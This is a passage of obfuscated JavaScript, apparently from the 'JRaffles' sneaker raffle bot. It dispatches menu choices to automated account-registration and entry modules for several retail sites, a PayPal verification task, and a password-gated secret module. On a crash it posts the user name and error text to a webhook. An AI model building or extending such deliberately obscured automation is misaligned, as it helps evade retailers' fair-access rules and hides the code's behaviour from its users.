                                        return console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x3a9fd4 = await _0x141827(), _0x5c5d8d = _0x3a9fd4['split'](';'), console['log'](_0x5c5d8d['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..'), await _0xd0cf86['function'](_0xd0cf86, _0x5c5d8d, _0x53f364), _0x91d894();
                                    }
                                }
                                ;
                            } else {
                                if (_0x3f8151[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                    var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x49f651('https://bouncewear.com/nl/account/register', _0xd0cf86);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3f8151[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                        var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x53f364 = await _0xd5e94a(), _0x4791a4 = await _0x6dea41();
                                            return await _0xd0cf86['function']('', _0xd0cf86, _0x4791a4, _0x53f364), _0x91d894();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x53f364 = await _0xd5e94a(), _0x4791a4 = await _0x6dea41();
                                                return await _0xd0cf86['function'](_0xd0cf86, _0x4791a4, _0x53f364), _0x91d894();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3f8151[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                            var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x53f364 = await _0xd5e94a(), _0x29ac3a = await _0x6dea41();
                                                return await _0xd0cf86['function'](_0xd0cf86, _0x29ac3a, _0x53f364), _0x91d894();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x53f364 = await _0xd5e94a(), _0x29ac3a = await _0x6dea41();
                                                    return await _0xd0cf86['function'](_0xd0cf86, _0x29ac3a, _0x53f364), _0x91d894();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3f8151[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                                var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x53f364 = await _0xd5e94a(), _0x2c03d4 = await _0x6dea41();
                                                    return await _0xd0cf86['function']('https://www.kickz.com/nl/login/', _0xd0cf86, _0x2c03d4, _0x53f364), _0x91d894();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x53f364 = await _0xd5e94a(), _0x2c03d4 = await _0x6dea41();
                                                        return await _0xd0cf86['function'](_0xd0cf86, _0x2c03d4, _0x53f364), _0x91d894();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3f8151[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                                    var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x53f364 = await _0xd5e94a(), _0x174df8 = await _0x6dea41();
                                                        return await _0xd0cf86['function'](_0xd0cf86, _0x174df8, _0x53f364), _0x91d894();
                                                    }
                                                } else {
                                                    if (_0x3f8151[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x207ff4(0x3e8), _0x91d894();
                                                    else {
                                                        if (_0x3f8151[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x57c13f = _0x3f8151[taskModule]['name'], _0x53f364 = await _0xd5e94a();
                                                            const _0x2cd634 = await _0x141827();
                                                            var _0x5c5d8d = _0x2cd634['split'](';');
                                                            await _0x26cb09(_0x5c5d8d, _0x57c13f, _0x53f364);
                                                        } else {
                                                            if (_0x3f8151[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x406fda(_0x3f8151[taskModule]['modules']);
                                                                var _0xd0cf86 = _0x3f8151[taskModule]['modules'][taskFunction];
                                                                return await _0xd0cf86['function'](_0xd0cf86), _0x91d894();
                                                            } else {
                                                                if (_0x3f8151[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x128f67 = 0x0;
                                                                    for (const _0x8a1c44 in _0x5a0dc7) {
                                                                        console['log']('(' + _0x128f67 + ')\x20' + _0x8a1c44 + '\x20:\x20' + _0x5a0dc7[_0x8a1c44]), _0x128f67++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x128f67 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0xdcf458 = await _0x42c9f2();
                                                                    if (_0xdcf458 == _0x128f67)
                                                                        return _0x91d894();
                                                                    console['clear'];
                                                                    var _0x4ab8d0 = 0x0;
                                                                    for (var _0xb9885c in _0x5a0dc7) {
                                                                        if (_0xdcf458 == _0x4ab8d0) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xb9885c + '\x20:'), _0x5a0dc7[_0xb9885c] = await _0x43c2cb(), _0x71872f['writeFileSync']('../settings.json', JSON['stringify'](_0x5a0dc7));
                                                                            break;
                                                                        } else
                                                                            _0x4ab8d0++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x207ff4(0xbb8), _0x91d894();
                                                                } else {
                                                                    if (_0x3f8151[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0xd175f0(), _0x91d894();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x3f8151[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x541184 = await _0x584f53();
                                                                            _0x541184 == 'ModuleVoorDeBoys' ? (await _0x2e99ee(), await _0x2c3db1(), await afewFunction(_0x4a3cb9[_0x58284a], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x207ff4(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x91d894();
        } catch (_0x26cf6c) {
            return console['log'](_0x26cf6c), await _0x207ff4(0x3a98);
        }
}
;
_0x2164fd('JRaffles\x20' + _0x2071e6), _0xd175f0();
try {
    _0x145baa();
} catch (_0x10e210) {
    var _0x139dd9 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x1d42cd
            },
            {
                'name': 'Version',
                'value': '' + _0x2071e6
            },
            {
                'name': 'Error',
                'value': '' + _0x10e210
            }
        ]
    }];
    const _0x124162 = { 'embeds': _0x139dd9 };
    _0xf7d9ce(_0x227865, _0x124162);
}